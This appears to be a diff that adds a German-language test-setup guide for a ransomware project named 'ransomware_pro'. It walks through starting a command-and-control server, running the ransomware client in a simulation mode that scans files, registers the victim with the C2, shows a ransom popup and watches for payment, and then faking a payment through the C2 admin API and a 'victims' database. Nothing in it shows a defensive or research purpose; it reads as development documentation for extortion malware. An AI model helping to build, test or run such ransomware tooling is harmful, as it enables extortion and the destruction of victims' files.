@@ -1,0 +1,69 @@
+TEST SETUP - LOCAL MACHINE
+==========================
+
+SCHRITT 1: Terminal 1 - C2 Server starten
+=========================================
+
+cd D:\ransomware_pro
+python test_server.py
+
+Output sollte sein:
+  ============================================================
+  C2 SERVER - TEST MODE
+  ============================================================
+  [+] Database: D:\ransomware_pro\test_victims.db
+  [+] Listening on: http://127.0.0.1:5000
+
+
+SCHRITT 2: Terminal 2 - Ransomware Test starten
+===============================================
+
+cd D:\ransomware_pro
+python test_mode.py 127.0.0.1
+
+Output sollte sein:
+  [*] Test Ransomware initialized: xxxx
+  [*] PHASE 1: SIMULATION - Scanning for files...
+  [*] WOULD ENCRYPT: (alle Dateien aufgelistet)
+  [*] PHASE 2: Registering with C2...
+  [*] POST http://127.0.0.1:5000/api/v1/register
+  [+] Registered: xxxx
+  [*] PHASE 3: Showing ransom screen...
+  [+] GUI popup displayed
+  [*] PHASE 4: Starting payment monitoring...
+
+
+SCHRITT 3: Payment simulieren (Terminal 3)
+==========================================
+
+curl -X POST http://127.0.0.1:5000/api/v1/admin/pay/xxxx
+
+oder mit Python:
+
+python -c "
+import urllib.request, json
+ransom_id = 'xxxx'  # Aus Terminal 2 kopieren
+url = f'http://127.0.0.1:5000/api/v1/admin/pay/{ransom_id}'
+req = urllib.request.Request(url, data=b'', method='POST')
+with urllib.request.urlopen(req) as r:
+    print(json.load(r))
+"
+
+Dann sollte Terminal 2 zeigen:
+  [!] PAYMENT DETECTED!
+  [+] WOULD DECRYPT FILES NOW (TEST MODE)
+
+
+WICHTIG:
+========
+- Keine Dateien werden wirlich verschlüsselt!
+- Keine Dateien werden gelöscht!
+- Nur Simulation der Verschlüsselung
+- Logs zeigen was passiert wäre
+
+DATABASE:
+=========
+sqlite3 D:\ransomware_pro\test_victims.db
+
+SELECT * FROM victims;
+UPDATE victims SET payment_received=1 WHERE ransom_id='xxxx';
